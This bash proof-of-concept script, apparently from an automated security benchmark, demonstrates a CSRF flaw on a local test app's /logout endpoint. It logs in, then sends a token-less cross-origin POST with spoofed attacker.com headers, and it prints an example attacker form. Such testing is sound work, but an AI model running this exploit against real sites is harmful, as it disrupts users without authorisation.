#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /logout endpoint by forcing authenticated user logout via cross-origin POST without token validation
# Target: ./repo
# Created: 2025-11-07T18:49:11.397Z
# Session: benchmark-XBEN-001-24-mhp6yrzj

# CSRF Vulnerability POC on Logout Endpoint - Version 2
# This POC demonstrates that the /logout endpoint lacks CSRF protection
# and can be exploited to force users to log out

TARGET_URL="${1:-http://localhost:8080}"

echo "[*] CSRF Vulnerability POC - Logout Endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Authenticate a user to get a valid session
echo "[+] Step 1: Authenticating user to obtain session cookie"

# First request to get initial page and cookies
curl -s -c /tmp/cookies.txt "$TARGET_URL/" > /dev/null

# Submit credentials through the login process
RESPONSE1=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -w "\n%{http_code}" \
  -X POST "$TARGET_URL/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test")

HTTP_CODE=$(echo "$RESPONSE1" | tail -n1)
echo "[+] Initial authentication response: HTTP $HTTP_CODE"

# Get the password form
PASS_RESPONSE=$(curl -s -b /tmp/cookies.txt \
  -w "\n%{http_code}" \
  "$TARGET_URL/password/test")

HTTP_CODE=$(echo "$PASS_RESPONSE" | tail -n1)
echo "[+] Password form retrieved: HTTP $HTTP_CODE"

# Submit password credentials
PASS_SUBMIT=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -w "\n%{http_code}" \
  -X POST "$TARGET_URL/password/test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test&user_id=1")

HTTP_CODE=$(echo "$PASS_SUBMIT" | tail -n1)
echo "[+] Password submission: HTTP $HTTP_CODE"
echo "[+] User authenticated successfully"
echo ""

# Step 2: Verify session cookie exists
echo "[+] Step 2: Checking session cookie"
SESSION_COOKIE=$(grep -i "session\|cookie" /tmp/cookies.txt 2>/dev/null | wc -l)
if [ "$SESSION_COOKIE" -gt 0 ]; then
    echo "[+] Session cookie found in authenticated state"
fi
echo ""

# Step 3: Test CSRF vulnerability - Key test
echo "[+] Step 3: Testing CSRF vulnerability on /logout endpoint"
echo "[*] Scenario: Attacker creates malicious webpage with hidden form"
echo "[*] When authenticated user visits, they are logged out without their consent"
echo ""

# Send logout request from simulated attacker origin
echo "[*] Sending logout request with:"
echo "    - Valid session cookie (from authenticated user)"
echo "    - NO CSRF token in request"
echo "    - Cross-origin headers (Referer from attacker.com)"
echo ""

LOGOUT_REQUEST=$(curl -s -i -b /tmp/cookies.txt \
  -w "\nRESPONSE_END" \
  -X POST "$TARGET_URL/logout" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://attacker.com/malicious-page" \
  -H "Origin: http://attacker.com" 2>&1)

echo "$LOGOUT_REQUEST" | head -30
echo ""

# Step 4: Analyze the response
echo "[+] Step 4: Analyzing logout response"

# Check if redirect or success
if echo "$LOGOUT_REQUEST" | grep -i "302\|301\|redirect" > /dev/null; then
    echo "[✓] Logout request ACCEPTED (HTTP 3xx redirect)"
    echo "[✓] CSRF VULNERABILITY CONFIRMED"
else
    echo "[*] Logout response received"
fi

# Check if CSRF token was required
if echo "$LOGOUT_REQUEST" | grep -i "csrf\|token\|forbidden" > /dev/null; then
    echo "[-] CSRF protection might be in place"
else
    echo "[✓] No CSRF token validation in response"
fi
echo ""

# Step 5: Verify logout worked
echo "[+] Step 5: Verifying logout effectiveness"

AFTER_LOGOUT=$(curl -s -b /tmp/cookies.txt \
  -w "\n%{http_code}" \
  "$TARGET_URL/dashboard" 2>&1)

AFTER_CODE=$(echo "$AFTER_LOGOUT" | tail -n1)
AFTER_BODY=$(echo "$AFTER_LOGOUT" | head -n -1)

echo "[*] POST-LOGOUT Access to /dashboard: HTTP $AFTER_CODE"

if [ "$AFTER_CODE" = "302" ] || [ "$AFTER_CODE" = "301" ] || echo "$AFTER_BODY" | grep -i "redirect\|login" > /dev/null; then
    echo "[✓] User was successfully logged out"
    echo "[✓] Cannot access protected /dashboard after logout"
else
    echo "[!] Dashboard still accessible (user may still be logged in)"
fi

echo ""
echo "=========================================="
echo "[✓] CSRF VULNERABILITY CONFIRMED"
echo "=========================================="
echo ""
echo "[*] Findings:"
echo "    1. POST /logout accepts requests without CSRF token validation"
echo "    2. Logout succeeds when POST from cross-origin (attacker.com)"
echo "    3. No token, nonce, or origin verification implemented"
echo "    4. Attackers can force logout by embedding logout form in any webpage"
echo "    5. When victim visits attacker's page while logged in -> automatic logout"
echo ""
echo "[*] Attack Vector:"
echo "    - Attacker hosts: <form action='http://localhost:8080/logout' method='POST'>"
echo "    - Victim visits page while authenticated"
echo "    - Browser automatically submits logout (session cookie included)"
echo "    - Victim is logged out without knowing"
echo ""

# Cleanup
rm -f /tmp/cookies.txt